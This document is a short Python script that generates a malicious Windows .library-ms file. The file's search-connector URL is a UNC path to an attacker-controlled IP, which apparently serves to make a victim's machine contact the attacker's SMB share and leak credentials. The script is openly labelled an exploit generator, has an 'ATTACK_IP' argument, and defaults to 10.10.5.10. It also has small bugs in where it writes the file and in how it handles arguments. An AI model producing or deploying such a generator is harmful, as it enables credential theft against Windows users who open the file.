import sys
import os

XML_TEMPLATE = """<?xml version="1.0" encoding="utf-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <repositoryDescriptionList>
    <repositoryDescription>
      <searchConnectorDescription>
        <simpleLocation>
          <url>\\\\{ip_address}\\vulnerability_project</url>
        </simpleLocation>
      </searchConnectorDescription>
    </repositoryDescription>
  </repositoryDescriptionList>
</libraryDescription>
"""

def generate_exploit(ip_address, output_filename):
    final_xml = XML_TEMPLATE.format(ip_address = ip_address)

    # Generate an output directory for the exploits
    output_dir = "generated_exploit"
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    # Verify that the extension is correct (.library-ms)
    if not output_filename.endswith(".library-ms"):
        output_filename += ".library-ms"

    file_path = os.path.join(output_dir, output_filename)

    try :
        with open(output_filename, "w", encoding="utf-8") as f:
            f.write(final_xml)
        print(f"[+] Exploit successfully generated ! : {file_path}")
        print(f"[+] Attacker's Ip address set to : {ip_address}")
    except IOError as e:
        print(f"[-] Error while exploit generation : {e}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <ATTACK_IP> <OUTPUT_FILE_NAME>")
        print("Exemple : python malicious_generator.py 10.10.5.10 test.library-ms")
        sys.argv = [sys.argv[0], "10.10.5.10", "test.library-ms"]
        #sys.exit(1)

    attacker_ip = sys.argv[1]
    output_file = sys.argv[2]

    generate_exploit(attacker_ip, output_file)